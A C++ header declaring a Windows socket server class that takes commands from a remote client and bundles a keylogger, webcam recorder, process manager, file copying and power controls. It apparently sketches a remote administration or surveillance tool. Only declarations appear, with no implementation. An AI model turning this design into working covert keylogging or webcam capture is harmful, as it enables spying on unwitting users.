#pragma once
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <thread>
#include <iostream>
#include <string>
#include "keylogger.h"
#include "PowerRelatedFunction.h"
#include "process_manager.h"
#include "copyfile.h"
#include "WebcamRecorder.h"
#pragma comment(lib, "ws2_32.lib")

class Server
{
public:
    std::string port;
    WSADATA wsaData;
    SOCKET listenSock = INVALID_SOCKET;
    SOCKET clientSock = INVALID_SOCKET;
    char command[BUFSIZ];
    struct addrinfo hints{}, *res = nullptr;

    const char *PORT = "27015";
    const int BUFSIZE = 512;

    keylogger keylog;
    std::thread keyLogThread;

    std::string videoFilePath;

    Server(std::string _port)
    {
        if (_port.empty())
        {
            port = PORT;
        }
    }
    Server();
    void Init();
    bool WaitForConnection();
    bool GetCommandFromClient();
    void ProcessCommand();
    void SendResult(std::string path);
    void DisconnectClient();
    void Shutdown();
};